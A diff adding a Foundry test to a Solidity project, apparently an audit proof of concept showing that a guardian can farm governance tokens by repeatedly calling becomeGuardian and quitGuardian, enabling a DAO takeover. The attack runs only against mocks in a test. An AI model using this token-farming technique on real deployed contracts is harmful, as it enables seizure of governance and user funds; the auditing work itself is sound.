@@ -274,4 +274,40 @@ contract VaultGuardiansBaseTest is Base_Test {
     function testGetGuardianDaoAndCut() public {
         assertEq(vaultGuardians.getGuardianAndDaoCut(), guardianAndDaoCut);
     }
+
+    function testDaoTakeover() public hasGuardian hasTokenGuardian {
+        address maliciousGuardian = makeAddr("maliciousGuardian");
+        uint256 startingVoterUsdcBalance = usdc.balanceOf(maliciousGuardian);
+        uint256 startingVoterWethBalance = weth.balanceOf(maliciousGuardian);
+        assertEq(startingVoterUsdcBalance, 0);
+        assertEq(startingVoterWethBalance, 0);
+
+        VaultGuardianGovernor governor = VaultGuardianGovernor(payable(vaultGuardians.owner()));
+        VaultGuardianToken vgToken = VaultGuardianToken(address(governor.token()));
+
+        // Flash loan the tokens, or just buy a bunch for 1 block
+        weth.mint(mintAmount, maliciousGuardian); // The same amount as the other guardians
+        uint256 startingMaliciousVGTokenBalance = vgToken.balanceOf(maliciousGuardian);
+        uint256 startingRegularVGTokenBalance = vgToken.balanceOf(guardian);
+        console.log("Malicious vgToken Balance:\t", startingMaliciousVGTokenBalance);
+        console.log("Regular vgToken Balance:\t", startingRegularVGTokenBalance);
+
+        // Malicious Guardian farms tokens
+        vm.startPrank(maliciousGuardian);
+        weth.approve(address(vaultGuardians), type(uint256).max);
+        for (uint256 i; i < 10; i++) {
+            address maliciousWethSharesVault = vaultGuardians.becomeGuardian(allocationData);
+            IERC20(maliciousWethSharesVault).approve(
+                address(vaultGuardians),
+                IERC20(maliciousWethSharesVault).balanceOf(maliciousGuardian)
+            );
+            vaultGuardians.quitGuardian();
+        }
+        vm.stopPrank();
+
+        uint256 endingMaliciousVGTokenBalance = vgToken.balanceOf(maliciousGuardian);
+        uint256 endingRegularVGTokenBalance = vgToken.balanceOf(guardian);
+        console.log("Malicious vgToken Balance:\t", endingMaliciousVGTokenBalance);
+        console.log("Regular vgToken Balance:\t", endingRegularVGTokenBalance);
+    }
 }
